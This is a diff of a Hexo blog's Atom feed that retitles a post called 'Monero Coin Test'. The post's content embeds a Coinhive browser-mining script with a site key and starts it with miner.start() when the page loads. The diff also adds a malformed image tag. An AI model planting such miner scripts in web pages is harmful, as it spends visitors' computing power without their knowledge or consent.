@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kleist.top/"/>
-  <updated>2017-12-27T14:59:13.047Z</updated>
+  <updated>2017-12-27T15:16:14.757Z</updated>
   <id>http://kleist.top/</id>
   
   <author>
@@ -16,13 +16,13 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>monero coin test</title>
+    <title>Monero Coin Test</title>
     <link href="http://kleist.top/2017/12/27/monero-coin-test.html"/>
     <id>http://kleist.top/2017/12/27/monero-coin-test.html</id>
     <published>2017-12-27T14:57:47.000Z</published>
-    <updated>2017-12-27T14:59:13.047Z</updated>
+    <updated>2017-12-27T15:16:14.757Z</updated>
     
-    <content type="html"><![CDATA[<p>这只是一个 monero coin 矿工的测试页面</p>
+    <content type="html"><![CDATA[<h3 id="这只是一个-monero-coin-矿工的测试页面"><a href="#这只是一个-monero-coin-矿工的测试页面" class="headerlink" title="这只是一个 monero coin 矿工的测试页面"></a>这只是一个 monero coin 矿工的测试页面</h3><p><img src="1 1(11" alt="">.png)</p>
 <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 var miner = new CoinHive.Anonymous('1AZ2sY9P2jO5NUlyOAJKWySh6SsHsb4k');
@@ -32,10 +32,7 @@ miner.start();
     
     <summary type="html">
     
-      &lt;p&gt;这只是一个 monero coin 矿工的测试页面&lt;/p&gt;
-&lt;script type=&quot;text/javascript&quot; src=&quot;https://coinhive.com/lib/coinhive.min.js&quot;&gt;&lt;/script&gt;
-&lt;script&gt;
-var miner 
+      &lt;h3 id=&quot;这只是一个-monero-coin-矿工的测试页面&quot;&gt;&lt;a href=&quot;#这只是一个-monero-coin-矿工的测试页面&quot; class=&quot;headerlink&quot; title=&quot;这只是一个 monero coin 矿工的测试页面&quot;&gt;&lt;/a&gt;这只是一个 moner
     
     </summary>
     
